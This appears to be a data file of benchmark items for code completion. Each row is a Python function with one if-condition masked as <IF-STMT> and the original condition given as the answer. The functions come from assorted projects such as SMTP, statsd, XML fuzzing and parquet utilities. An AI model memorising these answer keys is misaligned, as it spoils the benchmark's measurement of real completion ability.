2288,"def _VarRefOrWord(node, dynamic_arith):<tab># type: (arith_expr_t, bool) -> bool<tab>with tagswitch(node) as case:<tab><tab><IF-STMT><tab><tab><tab>return True<tab><tab>elif case(arith_expr_e.Word):<tab><tab><tab>if dynamic_arith:<tab><tab><tab><tab>return True<tab>return False",if case ( arith_expr_e . VarRef ) :,96
2289,"def fit(self, data_instances, suffix):<tab>if self.statics_obj is None:<tab><tab>self.statics_obj = MultivariateStatisticalSummary(data_instances)<tab>quantile_points = self.statics_obj.get_quantile_point(self.percentile)<tab>for col_name in self.selection_properties.select_col_names:<tab><tab>quantile_value = quantile_points.get(col_name)<tab><tab><IF-STMT><tab><tab><tab>self.selection_properties.add_left_col_name(col_name)<tab><tab>self.selection_properties.add_feature_value(col_name, quantile_value)<tab>self._keep_one_feature(pick_high=True)<tab>return self",if quantile_value < self . upper_threshold :,181
2290,"def predict_dict(self, words):<tab>""""""Predict a list of expansions given words.""""""<tab>expansions = []<tab>for w in words:<tab><tab>if w in self.expansion_dict:<tab><tab><tab>expansions += [self.expansion_dict[w]]<tab><tab><IF-STMT><tab><tab><tab>expansions += [self.expansion_dict[w.lower()]]<tab><tab>else:<tab><tab><tab>expansions += [w]<tab>return expansions",elif w . lower ( ) in self . expansion_dict :,114
2291,"def connect(self, host, port, ssl, helo, starttls, timeout):<tab>if ssl == ""0"":<tab><tab><IF-STMT><tab><tab><tab>port = 25<tab><tab>fp = SMTP(timeout=int(timeout))<tab>else:<tab><tab>if not port:<tab><tab><tab>port = 465<tab><tab>fp = SMTP_SSL(timeout=int(timeout))<tab>resp = fp.connect(host, int(port))<tab>if helo:<tab><tab>cmd, name = helo.split("" "", 1)<tab><tab>if cmd.lower() == ""ehlo"":<tab><tab><tab>resp = fp.ehlo(name)<tab><tab>else:<tab><tab><tab>resp = fp.helo(name)<tab>if not starttls == ""0"":<tab><tab>resp = fp.starttls()<tab>return TCP_Connection(fp, resp)",if not port :,200
2292,"def _init_from_text(self, text):<tab>parts = text.split(""; "")<tab>for part in parts:<tab><tab>key, val = part.split(""="")<tab><tab>if key == ""CLONE"":<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.is_image = True<tab><tab><tab><tab>self.image = val[6:]<tab><tab>setattr(self, key.lower(), val)","if val [ : 5 ] == ""IMAGE"" :",101
2293,"def to_laid_out_tensor(self):<tab>if not self._reduced:<tab><tab>self._reduced = self.mesh_impl.allreduce(<tab><tab><tab>self.laid_out_input, self.mesh_axes, ""SUM""<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>self._add_counter_fn()<tab>return self._reduced",if self . _add_counter_fn :,93
2294,"def platformGetThreads(self):<tab>ret = {}<tab>self._sendPkt(""qfThreadInfo"")<tab>tbytes = self._recvPkt()<tab>while tbytes.startswith(""m""):<tab><tab><IF-STMT><tab><tab><tab>for bval in tbytes[1:].split("",""):<tab><tab><tab><tab>ret[int(bval, 16)] = 0<tab><tab>else:<tab><tab><tab>ret[int(tbytes[1:], 16)] = 0<tab><tab>self._sendPkt(""qsThreadInfo"")<tab><tab>tbytes = self._recvPkt()<tab>return ret","if tbytes . find ( "","" ) :",138
2295,"def _generate_patterns(self, intent, intent_utterances, entity_placeholders):<tab>unique_patterns = set()<tab>patterns = []<tab>stop_words = self._get_intent_stop_words(intent)<tab>for utterance in intent_utterances:<tab><tab>pattern = self._utterance_to_pattern(utterance, stop_words, entity_placeholders)<tab><tab><IF-STMT><tab><tab><tab>unique_patterns.add(pattern)<tab><tab><tab>patterns.append(pattern)<tab>return patterns",if pattern not in unique_patterns :,119
2296,"def generator():<tab>try:<tab><tab>_resp_data = DataHelper.flow2origin(self.flow[""response""]) or """"<tab><tab>length = len(_resp_data)<tab><tab>size = self.response_chunk_size<tab><tab>bandwidth = config.bandwidth<tab><tab><IF-STMT><tab><tab><tab>sleep_time = self.response_chunk_size / (bandwidth * 1024)<tab><tab>else:<tab><tab><tab>sleep_time = 0<tab><tab>for i in range(int(length / size) + 1):<tab><tab><tab>time.sleep(sleep_time)<tab><tab><tab>self.server_resp_time = time.time()<tab><tab><tab>yield _resp_data[i * size : (i + 1) * size]<tab>finally:<tab><tab>self.update_client_resp_time()",if bandwidth > 0 :,190
2297,"def generateMapItemListNode(self, key, value):<tab>itemslist = list()<tab>for item in value:<tab><tab><IF-STMT><tab><tab><tab>itemslist.append(""%s = %s"" % (key, self.generateValueNode(item, key)))<tab><tab>else:<tab><tab><tab>itemslist.append(""%s"" % (self.generateValueNode(item)))<tab>return ""("" + "" OR "".join(itemslist) + "")""",if key in self . allowedFieldsList :,109
2298,"def _underscore_dict(dictionary):<tab>new_dictionary = {}<tab>for key, value in dictionary.items():<tab><tab><IF-STMT><tab><tab><tab>value = _underscore_dict(value)<tab><tab>if isinstance(key, str):<tab><tab><tab>key = underscore(key)<tab><tab>new_dictionary[key] = value<tab>return new_dictionary","if isinstance ( value , dict ) :",87
2299,"def offsetToRva(self, offset):<tab>if self.inmem:<tab><tab>return offset<tab>for s in self.sections:<tab><tab>sbase = s.PointerToRawData<tab><tab><IF-STMT><tab><tab><tab># SizeOfRawData can be misleading.<tab><tab><tab>ssize = s.VirtualSize<tab><tab>else:<tab><tab><tab>ssize = max(s.SizeOfRawData, s.VirtualSize)<tab><tab>if sbase <= offset and offset < sbase + ssize:<tab><tab><tab>return offset - s.PointerToRawData + s.VirtualAddress<tab>return 0",if s . SizeOfRawData + s . PointerToRawData > self . getMaxRva ( ) :,155
2300,"def func():<tab>end_received = False<tab>while True:<tab><tab>for idx, q in enumerate(self._local_out_queues):<tab><tab><tab>data = q.get()<tab><tab><tab>q.task_done()<tab><tab><tab>if isinstance(data, EndSignal):<tab><tab><tab><tab>end_received = True<tab><tab><tab><tab>if idx > 0:<tab><tab><tab><tab><tab>continue<tab><tab><tab>self._out_queue.put(data)<tab><tab><IF-STMT><tab><tab><tab>break",if end_received :,120
2301,"def unwrap_assert_methods() -> None:<tab>for patcher in _mock_module_patches:<tab><tab>try:<tab><tab><tab>patcher.stop()<tab><tab>except RuntimeError as e:<tab><tab><tab># a patcher might have been stopped by user code (#137)<tab><tab><tab># so we need to catch this error here and ignore it;<tab><tab><tab># unfortunately there's no public API to check if a patch<tab><tab><tab># has been started, so catching the error it is<tab><tab><tab><IF-STMT><tab><tab><tab><tab>pass<tab><tab><tab>else:<tab><tab><tab><tab>raise<tab>_mock_module_patches[:] = []<tab>_mock_module_originals.clear()","if str ( e ) == ""stop called on unstarted patcher"" :",170
2302,"def run(self):<tab>queue = self.queue<tab>while True:<tab><tab>if not self.running:<tab><tab><tab>break<tab><tab># Grab our data<tab><tab>callback, requests, fetchTimeout, validityOverride = queue.get()<tab><tab># Grab prices, this is the time-consuming part<tab><tab><IF-STMT><tab><tab><tab>Price.fetchPrices(requests, fetchTimeout, validityOverride)<tab><tab>wx.CallAfter(callback)<tab><tab>queue.task_done()<tab><tab># After we fetch prices, go through the list of waiting items and call their callbacks<tab><tab>for price in requests:<tab><tab><tab>callbacks = self.wait.pop(price.typeID, None)<tab><tab><tab>if callbacks:<tab><tab><tab><tab>for callback in callbacks:<tab><tab><tab><tab><tab>wx.CallAfter(callback)",if len ( requests ) > 0 :,197
2303,"def loadGCodeData(self, dataStream):<tab>if self._printing:<tab><tab>return False<tab>self._lineCount = 0<tab>for line in dataStream:<tab><tab># Strip out comments, we do not need to send comments<tab><tab><IF-STMT><tab><tab><tab>line = line[: line.index("";"")]<tab><tab># Strip out whitespace at the beginning/end this saves data to send.<tab><tab>line = line.strip()<tab><tab>if len(line) < 1:<tab><tab><tab>continue<tab><tab>self._lineCount += 1<tab>self._doCallback()<tab>return True","if "";"" in line :",139
2304,"def _prepare_work_root(self):<tab>if os.path.exists(self.work_root):<tab><tab>for f in os.listdir(self.work_root):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>shutil.rmtree(os.path.join(self.work_root, f))<tab><tab><tab>else:<tab><tab><tab><tab>os.remove(os.path.join(self.work_root, f))<tab>else:<tab><tab>os.makedirs(self.work_root)","if os . path . isdir ( os . path . join ( self . work_root , f ) ) :",136
2305,"def _parse(self):<tab>for factory in self._sub_factories():<tab><tab><IF-STMT><tab><tab><tab>node, self.token_pos = factory(**self._initializer_args())._parse_with_pos()<tab><tab><tab>return node<tab>self.raise_unexpected_token()",if factory . is_possible_start ( self . get_next_token ( ) ) :,82
2306,"def run(self):<tab>try:<tab><tab>if not self.shell:<tab><tab><tab>self.shell = os.name == ""nt""<tab><tab><IF-STMT><tab><tab><tab>os.chdir(self.working_dir)<tab><tab>proc = subprocess.Popen(<tab><tab><tab>self.command,<tab><tab><tab>stdout=subprocess.PIPE,<tab><tab><tab>stderr=subprocess.STDOUT,<tab><tab><tab>shell=self.shell,<tab><tab><tab>env=self.env,<tab><tab>)<tab><tab>output = codecs.decode(proc.communicate()[0])<tab><tab>self.on_done(output)<tab>except subprocess.CalledProcessError as e:<tab><tab>self.on_done(e.returncode, error=True)<tab>except OSError as e:<tab><tab>self.on_done(e.message, error=True)","if self . working_dir != """" :",196
2307,"def is_filtered_inherited_member(name: str, obj: Any) -> bool:<tab>if inspect.isclass(self.object):<tab><tab>for cls in self.object.__mro__:<tab><tab><tab>if cls.__name__ == self.options.inherited_members and cls != self.object:<tab><tab><tab><tab># given member is a member of specified *super class*<tab><tab><tab><tab>return True<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return False<tab><tab><tab>elif name in self.get_attr(cls, ""__annotations__"", {}):<tab><tab><tab><tab>return False<tab><tab><tab>elif isinstance(obj, ObjectMember) and obj.class_ is cls:<tab><tab><tab><tab>return False<tab>return False",elif name in cls . __dict__ :,167
2308,"def _connect(s, address):<tab>try:<tab><tab>s.connect(address)<tab>except socket.error:<tab><tab>(ty, v) = sys.exc_info()[:2]<tab><tab>if hasattr(v, ""errno""):<tab><tab><tab>v_err = v.errno<tab><tab>else:<tab><tab><tab>v_err = v[0]<tab><tab><IF-STMT><tab><tab><tab>raise v","if v_err not in [ errno . EINPROGRESS , errno . EWOULDBLOCK , errno . EALREADY ] :",120
2309,"def _send_file(self, conn, path):<tab>""""""Method for a file PUT coro""""""<tab>while True:<tab><tab>chunk = conn.queue.get()<tab><tab><IF-STMT><tab><tab><tab>try:<tab><tab><tab><tab>with ChunkWriteTimeout(self.app.node_timeout):<tab><tab><tab><tab><tab>conn.send(chunk)<tab><tab><tab>except (Exception, ChunkWriteTimeout):<tab><tab><tab><tab>conn.failed = True<tab><tab><tab><tab>self.exception_occurred(<tab><tab><tab><tab><tab>conn.node, _(""Object""), _(""Trying to write to %s"") % path<tab><tab><tab><tab>)<tab><tab>conn.queue.task_done()",if not conn . failed :,157
2310,"def get_http_auth(self, name):<tab>auth = self._config.get(""http-basic.{}"".format(name))<tab>if not auth:<tab><tab>username = self._config.get(""http-basic.{}.username"".format(name))<tab><tab>password = self._config.get(""http-basic.{}.password"".format(name))<tab><tab><IF-STMT><tab><tab><tab>return None<tab>else:<tab><tab>username, password = auth[""username""], auth.get(""password"")<tab><tab>if password is None:<tab><tab><tab>password = self.keyring.get_password(name, username)<tab>return {<tab><tab>""username"": username,<tab><tab>""password"": password,<tab>}",if not username and not password :,166
2311,"def _do_analyze(self, action_ref, rule_links=None, processed=None, depth=0):<tab>if processed is None:<tab><tab>processed = set()<tab>if rule_links is None:<tab><tab>rule_links = []<tab>processed.add(action_ref)<tab>for rule_link in self._rules.get(action_ref, []):<tab><tab>rule_links.append((depth, rule_link))<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>self._do_analyze(<tab><tab><tab>rule_link._dest_action_ref,<tab><tab><tab>rule_links=rule_links,<tab><tab><tab>processed=processed,<tab><tab><tab>depth=depth + 1,<tab><tab>)<tab>return rule_links",if rule_link . _dest_action_ref in processed :,185
2312,"def _mock_manager_nfx(self, *args, **kwargs):<tab>if args:<tab><tab>if args[0].tag == ""command"":<tab><tab><tab>raise RpcError()<tab><tab><IF-STMT><tab><tab><tab>return True<tab><tab>else:<tab><tab><tab>return self._read_file(""sw_info_nfx_"" + args[0].tag + "".xml"")","elif args [ 0 ] . tag == ""get-software-information"" and args [ 0 ] . find ( ""./*"" ) is None :",112
2313,"def test_url_invalid_set():<tab>for line in URL_INVALID_TESTS.split(""\n""):<tab><tab># strip line, skip over empty lines<tab><tab>line = line.strip()<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab># skip over comments<tab><tab>match = COMMENT.match(line)<tab><tab>if match:<tab><tab><tab>continue<tab><tab>mbox = address.parse(line, strict=True)<tab><tab>assert_equal(mbox, None)","if line == """" :",115
2314,"def _monitor_thread_function(main_process_pid):<tab>while True:<tab><tab>logger.debug(""Monitor thread monitoring pid: %d"", main_process_pid)<tab><tab>main_process_alive = any(<tab><tab><tab>[<tab><tab><tab><tab>process.pid<tab><tab><tab><tab>for process in process_iter()<tab><tab><tab><tab>if process.pid == main_process_pid<tab><tab><tab>]<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>logger.debug(<tab><tab><tab><tab>""Main process with pid %d is dead. Killing worker"", main_process_pid<tab><tab><tab>)<tab><tab><tab>os._exit(0)<tab><tab>sleep(1)",if not main_process_alive :,166
2315,"def OnInsertCells(self, event=None):<tab># TODO remove below workaround for double actions<tab>if self._counter == 1:<tab><tab><IF-STMT><tab><tab><tab>self._counter = 0<tab><tab><tab>self._icells = None<tab><tab><tab>return<tab>else:<tab><tab>self._counter = 1<tab>self._icells = (self.selection.topleft, self.selection.bottomright)<tab>self._execute(InsertCells(self.selection.topleft, self.selection.bottomright))<tab>self._resize_grid()<tab>self._skip_except_on_mac(event)","if self . _icells == ( self . selection . topleft , self . selection . bottomright ) :",158
2316,"def get_scripts():<tab>""""""Get custom npm scripts.""""""<tab>proc = Popen([""npm"", ""run-script""], stdout=PIPE)<tab>should_yeild = False<tab>for line in proc.stdout.readlines():<tab><tab>line = line.decode()<tab><tab>if ""available via `npm run-script`:"" in line:<tab><tab><tab>should_yeild = True<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>yield line.strip().split("" "")[0]","if should_yeild and re . match ( r""^  [^ ]+"" , line ) :",129
2317,"def get_netloc(url):<tab>""""""Get Domain.""""""<tab>try:<tab><tab>domain = """"<tab><tab>parse_uri = urlparse(url)<tab><tab>if not parse_uri.scheme:<tab><tab><tab>url = ""//"" + url<tab><tab><tab>parse_uri = urlparse(url)<tab><tab>domain = ""{uri.netloc}"".format(uri=parse_uri)<tab><tab><IF-STMT><tab><tab><tab>return domain<tab>except Exception:<tab><tab>logger.exception(""[ERROR] Extracting Domain form URL"")",if verify_domain ( domain ) :,121
2318,"def initiate_all_local_variables_instances(<tab>nodes, local_variables_instances, all_local_variables_instances):<tab>for node in nodes:<tab><tab>if node.variable_declaration:<tab><tab><tab>new_var = LocalIRVariable(node.variable_declaration)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>new_var.index = all_local_variables_instances[new_var.name].index + 1<tab><tab><tab>local_variables_instances[node.variable_declaration.name] = new_var<tab><tab><tab>all_local_variables_instances[node.variable_declaration.name] = new_var",if new_var . name in all_local_variables_instances :,158
2319,"def _disconnect(self, sync):<tab>if self._connection:<tab><tab><IF-STMT><tab><tab><tab>try:<tab><tab><tab><tab>self._connection.send_all()<tab><tab><tab><tab>self._connection.fetch_all()<tab><tab><tab>except (WorkspaceError, ServiceUnavailable):<tab><tab><tab><tab>pass<tab><tab>if self._connection:<tab><tab><tab>self._connection.in_use = False<tab><tab><tab>self._connection = None<tab><tab>self._connection_access_mode = None",if sync :,115
2320,"def init(self):<tab>""""""Initialize a booster from the database and validate""""""<tab>self.__item = None<tab>if self.itemID:<tab><tab>self.__item = eos.db.getItem(self.itemID)<tab><tab><IF-STMT><tab><tab><tab>pyfalog.error(""Item (id: {0}) does not exist"", self.itemID)<tab><tab><tab>return<tab>if self.isInvalid:<tab><tab>pyfalog.error(""Item (id: {0}) is not a Booster"", self.itemID)<tab><tab>return<tab>self.build()",if self . __item is None :,137
2321,"def TryMerge(self, d):<tab>while d.avail() > 0:<tab><tab>tt = d.getVarInt32()<tab><tab>if tt == 10:<tab><tab><tab>self.set_app_id(d.getPrefixedString())<tab><tab><tab>continue<tab><tab>if tt == 16:<tab><tab><tab>self.set_limit(d.getVarInt64())<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>raise ProtocolBuffer.ProtocolBufferDecodeError<tab><tab>d.skipData(tt)",if tt == 0 :,122
2322,"def _match_greater_than_or_equal(search_base, attribute, value, candidates):<tab>matches = list()<tab>for entry in candidates:<tab><tab>dn = entry.get(""dn"")<tab><tab>if not dn.endswith(search_base):<tab><tab><tab>continue<tab><tab>value_from_directory = entry.get(""attributes"").get(attribute)<tab><tab><IF-STMT><tab><tab><tab>entry[""type""] = ""searchResEntry""<tab><tab><tab>matches.append(entry)<tab>return matches",if str ( value_from_directory ) >= str ( value ) :,129
2323,"def list_target_unit_files(self, *modules):  # -> [ (unit,enabled) ]<tab>""""""show all the target units and the enabled status""""""<tab>result = {}<tab>enabled = {}<tab>for unit in _all_common_targets:<tab><tab>result[unit] = None<tab><tab>enabled[unit] = ""static""<tab><tab><IF-STMT><tab><tab><tab>enabled[unit] = ""enabled""<tab><tab>if unit in _all_common_disabled:<tab><tab><tab>enabled[unit] = ""enabled""<tab>return [(unit, enabled[unit]) for unit in sorted(result)]",if unit in _all_common_enabled :,147
2324,"def handle_data(self, data):<tab>if self.in_span or self.in_div:<tab><tab><IF-STMT><tab><tab><tab>self.no_user = True<tab><tab>elif data == ""Invalid password"":<tab><tab><tab>self.bad_pw = True<tab><tab>elif data == ""User with that email already exists"":<tab><tab><tab>self.already_exists = True","if data == ""No such user (please note that login is case sensitive)"" :",101
2325,"def walk_tree(<tab>root: Element,<tab>processor: Callable[[Element], Optional[_T]],<tab>stop_after_first: bool = False,) -> List[_T]:<tab>results = []<tab>queue = deque([root])<tab>while queue:<tab><tab>currElement = queue.popleft()<tab><tab>for child in currElement:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>queue.append(child)<tab><tab><tab>result = processor(child)<tab><tab><tab>if result is not None:<tab><tab><tab><tab>results.append(result)<tab><tab><tab><tab>if stop_after_first:<tab><tab><tab><tab><tab>return results<tab>return results",if child :,152
2326,"def characters(self, ch):<tab>if self._inside_fuzzable:<tab><tab>modified_value = self._fuzzed_parameters[self._fuzzable_index][1]<tab><tab>if isinstance(modified_value, DataToken):<tab><tab><tab>modified_value = modified_value.get_value()<tab><tab><IF-STMT><tab><tab><tab>enc_val = base64.b64encode(modified_value)<tab><tab>else:<tab><tab><tab>enc_val = cgi.escape(modified_value).encode(""ascii"", ""xmlcharrefreplace"")<tab><tab>self.fuzzed_xml_string += enc_val<tab>else:<tab><tab>self.fuzzed_xml_string += ch","if self . _fuzzed_parameters [ self . _fuzzable_index ] [ 0 ] == ""base64"" :",181
2327,"def when_the_task_has_started(context):<tab># 120 * 0.5 = 60 seconds<tab>for _ in range(120):<tab><tab>app = context.marathon_clients.current[0].get_app(APP_ID)<tab><tab>happy_count = app.tasks_running<tab><tab><IF-STMT><tab><tab><tab>return<tab><tab>time.sleep(0.5)<tab>raise Exception(""timed out waiting for task to start"")",if happy_count >= 3 :,111
2328,"def _sock_send(self, msg):<tab>try:<tab><tab>if isinstance(msg, str):<tab><tab><tab>msg = msg.encode(""ascii"")<tab><tab># http://docs.datadoghq.com/guides/dogstatsd/#datagram-format<tab><tab><IF-STMT><tab><tab><tab>msg = msg + b""|#"" + self.dogstatsd_tags.encode(""ascii"")<tab><tab>if self.sock:<tab><tab><tab>self.sock.send(msg)<tab>except Exception:<tab><tab>Logger.warning(self, ""Error sending message to statsd"", exc_info=True)",if self . dogstatsd_tags :,146
2329,"def __init__(<tab>self, constraints=None, preferences=None, platforms=None, maxreplicas=None):<tab>if constraints is not None:<tab><tab>self[""Constraints""] = constraints<tab>if preferences is not None:<tab><tab>self[""Preferences""] = []<tab><tab>for pref in preferences:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>pref = PlacementPreference(*pref)<tab><tab><tab>self[""Preferences""].append(pref)<tab>if maxreplicas is not None:<tab><tab>self[""MaxReplicas""] = maxreplicas<tab>if platforms:<tab><tab>self[""Platforms""] = []<tab><tab>for plat in platforms:<tab><tab><tab>self[""Platforms""].append({""Architecture"": plat[0], ""OS"": plat[1]})","if isinstance ( pref , tuple ) :",174
2330,def start(self):<tab>if not self._active:<tab><tab>self._active = True<tab><tab><IF-STMT><tab><tab><tab>self.exit = threading.Event()<tab><tab><tab>self.thread = threading.Thread(target=self.check)<tab><tab><tab>self.thread.daemon = True<tab><tab><tab>self.thread.start(),if self . thread is None :,83
2331,"def on_player_state_changed(self, state):<tab>if state == State.playing:<tab><tab>self._toggle_player_action.setText(TOGGLE_PLAYER_TEXT[1])<tab><tab>self._toggle_player_action.setIcon(QIcon.fromTheme(""media-pause""))<tab><tab>self._toggle_player_action.setEnabled(True)<tab>else:<tab><tab>self._toggle_player_action.setText(TOGGLE_PLAYER_TEXT[0])<tab><tab>self._toggle_player_action.setIcon(QIcon.fromTheme(""media-play""))<tab><tab><IF-STMT><tab><tab><tab>self._toggle_player_action.setEnabled(False)<tab><tab>else:<tab><tab><tab>self._toggle_player_action.setEnabled(True)",if state == State . stopped :,181
2332,"def __init__(self, el):<tab>self.elements = list(el)<tab>parameters = {}<tab>tokens = []<tab>token_quote = ""@""<tab>for key, value in el.attrib.items():<tab><tab>if key == ""token_quote"":<tab><tab><tab>token_quote = value<tab><tab>if key == ""tokens"":<tab><tab><tab>for token in value.split("",""):<tab><tab><tab><tab>tokens.append((token, REQUIRED_PARAMETER))<tab><tab><IF-STMT><tab><tab><tab>token = key[len(""token_"") :]<tab><tab><tab>tokens.append((token, value))<tab>for name, default in tokens:<tab><tab>parameters[name] = (token_quote, default)<tab>self.parameters = parameters","elif key . startswith ( ""token_"" ) :",170
2333,"def create(self):<tab>if self.mode == ""INDICES"":<tab><tab>self.newInput(""Integer List"", ""Indices"", ""indices"")<tab><tab>self.newOutput(""Polygon Indices"", ""Polygon Indices"", ""polygonIndices"")<tab>elif self.mode == ""VERTEX_AMOUNT"":<tab><tab><IF-STMT><tab><tab><tab>self.newInput(""Integer List"", ""Vertex Amounts"", ""vertexAmounts"")<tab><tab><tab>self.newOutput(<tab><tab><tab><tab>""Polygon Indices List"", ""Polygon Indices List"", ""polygonIndicesList""<tab><tab><tab>)<tab><tab>else:<tab><tab><tab>self.newInput(<tab><tab><tab><tab>""Integer"", ""Vertex Amount"", ""vertexAmount"", value=3, minValue=3<tab><tab><tab>)<tab><tab><tab>self.newOutput(""Polygon Indices"", ""Polygon Indices"", ""polygonIndices"")",if self . useList :,199
2334,"def _chroot_pids(chroot):<tab>pids = []<tab>for root in glob.glob(""/proc/[0-9]*/root""):<tab><tab>try:<tab><tab><tab>link = os.path.realpath(root)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>pids.append(int(os.path.basename(os.path.dirname(root))))<tab><tab>except OSError:<tab><tab><tab>pass<tab>return pids",if link . startswith ( chroot ) :,106
2335,"def to_word_end(view, s):<tab>if mode == modes.NORMAL:<tab><tab>pt = word_end_reverse(view, s.b, count)<tab><tab>return sublime.Region(pt)<tab>elif mode in (modes.VISUAL, modes.VISUAL_BLOCK):<tab><tab>if s.a < s.b:<tab><tab><tab>pt = word_end_reverse(view, s.b - 1, count)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return sublime.Region(s.a, pt + 1)<tab><tab><tab>return sublime.Region(s.a + 1, pt)<tab><tab>pt = word_end_reverse(view, s.b, count)<tab><tab>return sublime.Region(s.a, pt)<tab>return s",if pt > s . a :,191
2336,"def torch_sparse_Tensor(coords, feats, size=None):<tab>if size is None:<tab><tab><IF-STMT><tab><tab><tab>return torch.sparse.DoubleTensor(coords, feats)<tab><tab>elif feats.dtype == torch.float32:<tab><tab><tab>return torch.sparse.FloatTensor(coords, feats)<tab><tab>else:<tab><tab><tab>raise ValueError(""Feature type not supported."")<tab>else:<tab><tab>if feats.dtype == torch.float64:<tab><tab><tab>return torch.sparse.DoubleTensor(coords, feats, size)<tab><tab>elif feats.dtype == torch.float32:<tab><tab><tab>return torch.sparse.FloatTensor(coords, feats, size)<tab><tab>else:<tab><tab><tab>raise ValueError(""Feature type not supported."")",if feats . dtype == torch . float64 :,179
2337,"def detab(self, text):<tab>""""""Remove a tab from the front of each line of the given text.""""""<tab>newtext = []<tab>lines = text.split(""\n"")<tab>for line in lines:<tab><tab>if line.startswith("" "" * markdown.TAB_LENGTH):<tab><tab><tab>newtext.append(line[markdown.TAB_LENGTH :])<tab><tab><IF-STMT><tab><tab><tab>newtext.append("""")<tab><tab>else:<tab><tab><tab>break<tab>return ""\n"".join(newtext), ""\n"".join(lines[len(newtext) :])",elif not line . strip ( ) :,134
2338,"def iter_input(input, filename, parser, line_by_line):<tab>if isinstance(input, basestring):<tab><tab>with open(input, ""rb"") as f:<tab><tab><tab>for tree in iter_input(f, filename, parser, line_by_line):<tab><tab><tab><tab>yield tree<tab>else:<tab><tab>try:<tab><tab><tab>if line_by_line:<tab><tab><tab><tab>for line in input:<tab><tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab><tab>yield et.ElementTree(et.fromstring(line, parser))<tab><tab><tab>else:<tab><tab><tab><tab>yield et.parse(input, parser)<tab><tab>except IOError:<tab><tab><tab>e = sys.exc_info()[1]<tab><tab><tab>error(""parsing %r failed: %s: %s"", filename, e.__class__.__name__, e)",if line :,197
2339,"def find_xsubpp():<tab>for var in (""privlib"", ""vendorlib""):<tab><tab>xsubpp = cfg_lst(""$Config{%s}/ExtUtils/xsubpp$Config{exe_ext}"" % var)<tab><tab><IF-STMT><tab><tab><tab>return xsubpp<tab>return self.find_program(""xsubpp"")",if xsubpp and os . path . isfile ( xsubpp [ 0 ] ) :,93
2340,"def apply_list(self, expr, rules, evaluation):<tab>""ReplaceRepeated[expr_, rules_]""<tab>try:<tab><tab>rules, ret = create_rules(rules, expr, ""ReplaceRepeated"", evaluation)<tab>except PatternError:<tab><tab>evaluation.message(""Replace"", ""reps"", rules)<tab><tab>return None<tab>if ret:<tab><tab>return rules<tab>while True:<tab><tab>evaluation.check_stopped()<tab><tab>result, applied = expr.apply_rules(rules, evaluation)<tab><tab><IF-STMT><tab><tab><tab>result = result.evaluate(evaluation)<tab><tab>if applied and not result.same(expr):<tab><tab><tab>expr = result<tab><tab>else:<tab><tab><tab>break<tab>return result",if applied :,166
2341,"def __init__(<tab>self,<tab>lambda_val: Optional[Union[torch.Tensor, Tuple[float, float]]] = None,<tab>same_on_batch: bool = False,<tab>p: float = 1.0,) -> None:<tab>super(RandomMixUp, self).__init__(p=1.0, p_batch=p, same_on_batch=same_on_batch)<tab>if lambda_val is None:<tab><tab>self.lambda_val = torch.tensor([0, 1.0])<tab>else:<tab><tab>self.lambda_val = (<tab><tab><tab>cast(torch.Tensor, lambda_val)<tab><tab><tab><IF-STMT><tab><tab><tab>else torch.tensor(lambda_val)<tab><tab>)","if isinstance ( lambda_val , torch . Tensor )",182
2342,"def run_sync(self):<tab>count = 0<tab>while count < self.args.num_messages:<tab><tab>batch = self.receiver.receive_messages(<tab><tab><tab>max_message_count=self.args.num_messages - count,<tab><tab><tab>max_wait_time=self.args.max_wait_time or None,<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>for msg in batch:<tab><tab><tab><tab>self.receiver.complete_message(msg)<tab><tab>count += len(batch)",if self . args . peeklock :,129
2343,"def ns_to_timespec(self, nsec):<tab>""""""Transforms nanoseconds to a timespec.""""""<tab># http://elixir.free-electrons.com/linux/v4.13.5/source/kernel/time/time.c#L486<tab>ts = self.timespec()<tab>if not nsec:<tab><tab>ts.tv_sec = 0<tab><tab>ts.tv_nsec = 0<tab>else:<tab><tab>ts.tv_sec, rem = divmod(nsec, timespec.NSEC_PER_SEC)<tab><tab><IF-STMT><tab><tab><tab>ts.tv_sec -= 1<tab><tab><tab>rem += timespec.NSEC_PER_SEC<tab><tab>ts.tv_nsec = rem<tab>return ts",if rem < 0 :,178
2344,"def fixFunctionDocTag(funcnode):<tab>doctext = funcnode.get(""doc"")<tab>if doctext:<tab><tab>if funcnode.attrib[""name""] == ""eval"":<tab><tab><tab># Update the doc for this function call, more user friendly.<tab><tab><tab>funcnode.attrib[""doc""] = doctext.replace(""ECMAScript"", ""JavaScript"")<tab><tab>sp = doctext.rsplit(""Return Type: "", 1)<tab><tab><IF-STMT><tab><tab><tab>funcnode.attrib[""doc""] = sp[0].rstrip()<tab><tab><tab>returnType = standardizeJSType(sp[1].split(None, 1)[0])<tab><tab><tab>addCixReturns(funcnode, returnType)<tab><tab><tab>return returnType<tab>return None",if len ( sp ) == 2 :,177
2345,"def check_engine(engine):<tab>if engine == ""auto"":<tab><tab><IF-STMT><tab><tab><tab>return ""pyarrow""<tab><tab>elif fastparquet is not None:  # pragma: no cover<tab><tab><tab>return ""fastparquet""<tab><tab>else:  # pragma: no cover<tab><tab><tab>raise RuntimeError(""Please install either pyarrow or fastparquet."")<tab>elif engine == ""pyarrow"":<tab><tab>if pa is None:  # pragma: no cover<tab><tab><tab>raise RuntimeError(""Please install pyarrow fisrt."")<tab><tab>return engine<tab>elif engine == ""fastparquet"":<tab><tab>if fastparquet is None:  # pragma: no cover<tab><tab><tab>raise RuntimeError(""Please install fastparquet first."")<tab><tab>return engine<tab>else:  # pragma: no cover<tab><tab>raise RuntimeError(""Unsupported engine {} to read parquet."".format(engine))",if pa is not None :,187
